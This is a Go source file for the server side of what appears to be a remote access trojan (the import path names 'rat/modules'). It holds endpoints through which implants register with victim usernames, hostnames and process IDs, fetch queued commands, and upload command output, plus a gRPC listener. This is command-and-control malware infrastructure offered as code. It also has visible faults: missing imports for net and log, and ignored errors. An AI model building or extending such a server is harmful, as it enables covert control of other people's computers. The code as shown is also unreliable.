package server

import (
	"github.com/gin-gonic/gin"
	"fmt"
	"database/sql"
	"scurrier/config"
	"scurrier/utils"
	"scurrier/types"
	"google.golang.org/grpc"
      pb "scurrier/rat/modules/pb" // adjust path to your generated pb files

	"errors"
	
)


type Server struct  {
	DB *sql.DB
	//pb.MyService
	Config *config.Config
}


const (
	ERROR_MISSING_DETAILS = 10
	ERROR_SERVER_ERROR    = 11
	ERROR_USER_REGISTERED = 12
	ERROR_UNAUTHORISED    = 13
	ERROR_TOKEN_EXPIRED   = 14
	ERROR_TOKEN_SIGNWRONG = 15
	ERROR_TOKEN_INVALID   = 16
	ERROR_INVALID_CLAIMS  = 17
	ERROR_NO_COMMAND      = 18

)


func RunServer(server *Server) {

	go func() {
                lis, err := net.Listen("tcp", ":50051")
                if err != nil {
                        log.Fatalf("failed to listen: %v", err)
                }

                s := grpc.NewServer()


                pb.RegisterMyServiceServer(s, server)

                log.Println("gRPC server listening on :50051")
                if err := s.Serve(lis); err != nil {
                        log.Fatalf("failed to serve: %v", err)
                }
        }()


	router := gin.Default()

	router.POST(server.Config.Endpoints["RegisterEndpoint"], server.RegisterEndpoint)
	router.GET(server.Config.Endpoints["getTaskEndpoint"], server.GetTaskEndpoint)
	router.POST(server.Config.Endpoints["postOutputEndpoint"], server.PostOutputEndpoint)
	//router.GET(server.Config.Endpoints["WebSocketEndpoint"], server.webSocketEndpoint)
	router.Run(":" + server.Config.Port)
}



func (s *Server) PostOutputEndpoint(c *gin.Context) {
	ClientID := c.GetHeader("X-Client-ID")
	AuthToken := c.GetHeader("X-Auth-Token")

	if AuthToken == "" || ClientID == "" {
		fmt.Println("Token OR id not set")
		res := utils.CraftErrorResponse(ERROR_UNAUTHORISED)
		c.Data(403, "application/octet-stream", res)
		return
	}

	ok, err, code := s.ValidateToken(AuthToken) 
	if !ok || err != nil {
		res := utils.CraftErrorResponse(code)
		fmt.Println(err)
		c.Data(403, "application/octet-stream", res)
		return
	}

	data,err := c.GetRawData()

	_ = utils.ParseOutputData(data)
	c.Data(200, "application/octet-stream", nil)


}

func (s *Server) GetTaskEndpoint(c *gin.Context) {
	ClientID := c.GetHeader("X-Client-ID")
	AuthToken := c.GetHeader("X-Auth-Token")

	if AuthToken == "" || ClientID == "" {
		fmt.Println("Token OR id not set")
		res := utils.CraftErrorResponse(ERROR_UNAUTHORISED)
		c.Data(403, "application/octet-stream", res)
		return
	}

	ok, err, code := s.ValidateToken(AuthToken) 
	if !ok || err != nil {
		res := utils.CraftErrorResponse(code)
		fmt.Println(err)
		c.Data(403, "application/octet-stream", res)
		return
	}

	var cmd *types.CommandReply
	cmd, err = s.RetrieveCommand(ClientID)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			res := utils.CraftErrorResponse(ERROR_NO_COMMAND)
			c.Data(404, "application/octet-stream", res)
			return
		} else {
			res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
			c.Data(500, "application/octet-stream", res)
			return
		}
	} 

	commandBytes := utils.CraftCommandBytes(cmd)
	if commandBytes == nil {
		res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
		c.Data(503, "application/octet-stream", res)
	}
	c.Data(200, "application/octet-stream", commandBytes)
	return


}


func (s *Server) RegisterEndpoint(c *gin.Context) {
	body, err := c.GetRawData()
	if err != nil {
		res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
		fmt.Println(err)
		c.Data(500, "application/octet-stream", res)
    	return
	}

	ClientInfo, err := utils.ParseRegisterBytes(body)
	if err != nil {
		res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
		c.Data(500, "application/octet-stream", res)
    	return
	}

	if ClientInfo.Guid == "" || ClientInfo.Username == "" || ClientInfo.Hostname == "" || ClientInfo.PID <= 0 || ClientInfo.Arch <= 0 || ClientInfo.Arch >=2 || ClientInfo.Version == "" {
		res := utils.CraftErrorResponse(ERROR_MISSING_DETAILS)
		c.Data(400, "application/octet-stream", res)
    		return
	}

	ok, err := s.LookupIfUserExists(ClientInfo.Username, ClientInfo.Hostname)

	if ok || err != nil {
		res := utils.CraftErrorResponse(ERROR_USER_REGISTERED)
		fmt.Println(err)

		c.Data(409, "application/octet-stream", res)
    	return
	}

	token, refresh, err := s.CreateJWT(ClientInfo.Username, ClientInfo.Hostname)
	if err != nil {
		res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
		c.Data(500, "application/octet-stream", res)
		fmt.Println(err)
    	return
	}
	clientIP := c.ClientIP()
	ok, err = s.InsertNewUser(ClientInfo, clientIP)

	if err != nil || !ok {
		res := utils.CraftErrorResponse(ERROR_SERVER_ERROR)
		c.Data(500, "application/octet-stream", res)
		fmt.Println(err)
    	return
	} else {
		JwtByteData := utils.CreateRegisterResponseBytes(token, refresh)
		c.Data(200, "application/octet-stream", JwtByteData)
		return
	}

	

}
